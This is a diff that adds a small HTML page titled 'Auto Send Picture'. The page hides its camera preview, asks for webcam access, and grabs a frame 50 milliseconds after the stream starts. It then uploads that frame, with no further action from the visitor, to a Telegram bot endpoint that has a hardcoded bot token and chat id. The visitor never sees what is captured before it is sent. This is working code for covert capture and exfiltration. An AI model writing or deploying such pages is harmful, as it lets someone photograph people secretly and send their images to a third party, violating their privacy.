@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Auto Send Picture</title>
+  <style>
+    body { font-family: Arial; text-align: center; margin-top: 50px; }
+    #video { display: none; } /* hide camera preview */
+  </style>
+</head>
+<body>
+  <h2>Initializing camera...</h2>
+
+  <video id="video" autoplay playsinline></video>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.createElement('canvas');
+    const context = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          // Capture almost immediately
+          setTimeout(captureAndSend, 50); // 50ms delay
+        };
+      })
+      .catch(err => {
+        alert("Camera access denied: " + err);
+      });
+
+    function captureAndSend() {
+      canvas.width = 300;
+      canvas.height = 200;
+      context.drawImage(video, 0, 0, 300, 200);
+
+      const dataUrl = canvas.toDataURL("image/png");
+      const blob = dataURItoBlob(dataUrl);
+
+      const formData = new FormData();
+      formData.append("chat_id", "1194921987");  // your chat id
+      formData.append("photo", blob, "photo.png");
+
+      fetch("https://api.telegram.org/bot8086273002:AAES6FEk1pmUnsbfL6jnYYlCVgeunWBplFo/sendPhoto", {
+        method: "POST",
+        body: formData
+      })
+      .then(res => res.json())
+      .then(data => {
+        console.log("✅ Photo sent:", data);
+        document.body.innerHTML = "<h2>Photo sent successfully!</h2>";
+      })
+      .catch(err => {
+        console.error("❌ Error sending photo:", err);
+        document.body.innerHTML = "<h2>Error sending photo</h2>";
+      });
+    }
+
+    function dataURItoBlob(dataURI) {
+      let byteString = atob(dataURI.split(',')[1]);
+      let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      let ab = new ArrayBuffer(byteString.length);
+      let ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
+  </script>
+</body>
+</html>
